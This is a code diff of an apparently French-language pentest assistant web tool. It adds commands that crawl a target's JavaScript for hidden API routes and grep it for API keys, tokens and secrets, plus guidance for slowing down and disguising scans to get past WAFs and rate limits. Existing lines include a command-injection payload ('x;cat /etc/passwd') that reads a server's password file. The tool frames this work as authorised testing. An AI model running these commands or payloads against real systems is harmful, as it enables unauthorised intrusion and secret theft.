@@ -230,7 +230,8 @@ recon:[
 disco:[
  {t:"Brute des chemins (ffuf) — mode discret", c:`ffuf -u ${U}/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,204,301,302,307,401,403 -t 5 -rate 20`, e:`Trouve pages/API cachées. <b>-t 5 -rate 20 = discret</b> (évite le ban Wordfence/hébergeur). 403 = existe mais protégé. Sur prod fragile, baisse encore : <code>-rate 8</code>.`},
  {t:"Extensions utiles (discret)", c:`ffuf -u ${U}/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.bak,.old,.txt,.zip,.sql -mc 200 -t 5 -rate 20`, e:`.bak/.old/.sql/.zip = sauvegardes/code source exposés (souvent jackpot). Rythme bridé pour ne pas se faire bannir.`},
- {t:"Endpoints dans le JS", c:`curl -s ${U}/ | grep -oE 'src="[^"]+\\.js"' ; echo "→ puis analyser chaque .js (routes /api, clés)"`, e:`Le JS des SPA expose des routes d'API non listées ailleurs.`}
+ {t:"Endpoints dans le JS (analyse réelle de chaque .js)", c:`curl -s -A "Mozilla/5.0" ${U}/ | grep -oE 'src="[^"]+\\.js[^"]*"' | sed -E 's/^src="//;s/"$//;s#^//#https://#;s#^/#${U}/#' | sort -u | while read J; do echo "== \$J =="; curl -s -A "Mozilla/5.0" "\$J" | grep -oE '"/[a-zA-Z0-9_./?&=-]{2,}"|https?://[a-zA-Z0-9_./?&=%-]+' | grep -viE 'w3\\.org|schema\\.org|googleapis|gstatic|fonts\\.' | sort -u | head -40; done`, e:`Télécharge CHAQUE .js (même en .js?ver=…) et en extrait les routes /api et URLs cachées. Pro : <code>linkfinder -i ${U} -d -o cli</code> ou <code>jsluice urls fichier.js</code>. Une route /api non listée ailleurs = surface d'attaque.`},
+ {t:"Secrets / clés dans le JS", c:`curl -s -A "Mozilla/5.0" ${U}/ | grep -oE 'src="[^"]+\\.js[^"]*"' | sed -E 's/^src="//;s/"$//;s#^//#https://#;s#^/#${U}/#' | sort -u | while read J; do echo "== \$J =="; curl -s -A "Mozilla/5.0" "\$J" | grep -noiE 'api[_-]?key|secret|token|authoriz|bearer|aws_access|firebase|client_secret|x-api-key'; done`, e:`Cherche des clés/tokens oubliés dans le JS (clé Google/Firebase, bearer, secret). Pro : <code>jsluice secrets fichier.js</code> ou SecretFinder. ⚠️ Sous mandat ; une vraie clé = faille critique (au coffre, ne pas diffuser).`}
 ],
 infra:[
  {t:"Scan ports + services + version", c:`nmap -Pn -sV -sC -p- --min-rate 2000 ${T}`, e:`Liste ports ouverts, services, versions. Note tout ce qui a une version (→ searchsploit).`},
@@ -529,6 +530,27 @@ function cpv(btn){var t=btn.parentNode.querySelector('code').innerText;navigator
 /* ===================== MOTEUR ADAPTATIF : lire la sortie -> débloquer la suite ===================== */
 function scan(t){
   var U=AGT.U||'https://cible', P=AGT.P||'id';
+  var raw=(t||'').trim();
+  // SORTIE VIDE : la commande n'a rien renvoyé → ce n'est PAS forcément un échec, on diagnostique.
+  if(raw===''){ return {cls:'warn',msg:'⬜ La commande n\'a RIEN renvoyé (sortie vide). À interpréter — ça peut être : (a) rien trouvé = pas vulnérable sur ce point ; (b) bloqué (WAF/403) ; (c) réseau/proxy ; (d) ton motif grep ne matchait rien. Lance ces vérifs :',
+    follow:[
+      {t:'La cible répond-elle ? (code HTTP + taille)',c:'curl -s -o /dev/null -w "HTTP %{http_code} | %{size_download} o | %{time_total}s\\n" -A "Mozilla/5.0" '+U+'/',e:'200 + taille > 0 = OK (c\'est ton motif qui filtrait à vide). 403/406/429 = WAF/throttle. 000 = DNS/proxy/réseau.'},
+      {t:'Voir la vraie réponse (sans filtre)',c:'curl -s -A "Mozilla/5.0" '+U+'/ | head -c 800',e:'Plein = c\'est ton grep/pattern qui ne matchait pas (sortie filtrée à vide, pas un échec). Vide ici aussi = la cible ne renvoie rien (bloqué, offline, mauvais chemin).'},
+      {t:'Forcer SANS proxy (cas Burp/FoxyProxy)',c:'curl -s -x "" -A "Mozilla/5.0" '+U+'/ | head -c 300',e:'Un proxy Burp mal réglé renvoie souvent du vide. -x "" ignore le proxy.'}
+    ],report:null,unlock:null};
+  }
+  // ERREUR RÉSEAU (pas la cible)
+  if(/could not resolve host|name or service not known|connection refused|connection timed out|failed to connect|couldn.t connect|no route to host/i.test(raw))
+    return {cls:'warn',msg:'🌐 Problème RÉSEAU (DNS / proxy / connectivité), pas une absence de faille : la commande n\'a pas pu joindre la cible.',
+      follow:[{t:'Diagnostic réseau (voir aussi copilote-pentest « réseau »)',c:'getent hosts '+(AGT.T||'exemple.com')+' ; curl -s -o /dev/null -w "%{http_code}\\n" https://1.1.1.1',e:'Pas de résolution → DNS/resolv.conf ; 1.1.1.1 KO → proxy Burp/FoxyProxy ou pas d\'internet.'}],report:null,unlock:null};
+  // BLOCAGE WAF (403/406)
+  if(/\b(403|406)\b/.test(raw) && /forbidden|not acceptable|cloudflare|akamai|mod_security|request blocked|access denied|incapsula|sucuri/i.test(raw))
+    return {cls:'warn',msg:'🛡️ Bloqué par un WAF/pare-feu (403/406). Ce n\'est pas « pas de faille » : il faut ralentir et camoufler (sous mandat).',
+      follow:[{t:'Ralentir + user-agent + throttle',c:'wpscan --url '+U+' --stealthy --throttle 1200 --random-user-agent    # ou  ffuf -rate 8 -t 3 -H "User-Agent: Mozilla/5.0"',e:'Un 403 systématique = WAF à contourner proprement, pas un site sain.'}],report:null,unlock:null};
+  // RATE-LIMIT (429)
+  if(/\b429\b|too many requests|rate.?limit/i.test(raw))
+    return {cls:'warn',msg:'⏳ Rate-limit (429) : tu vas trop vite → les résultats sont faussés (faux négatifs). Ralentis fortement.',
+      follow:[{t:'Throttle agressif',c:'# wpscan : --throttle 2000   |   ffuf : -rate 5 -t 2   puis relance',e:'Attends quelques minutes puis reprends plus lentement.'}],report:null,unlock:null};
   // RCE (uid=… gid=…)
   if(/uid=\d+.*gid=\d+/i.test(t)) return {cls:'ok',msg:'💥 RCE CONFIRMÉE — tu exécutes des commandes sur le serveur (uid=… présent).',
     follow:[{t:'Lire un fichier (preuve)',c:'curl -s "'+U+'/?'+P+'=x;cat /etc/passwd"',e:'Preuve de lecture serveur. Pour un fichier CLIENT précis → panneau ③ ci-dessus.'}],
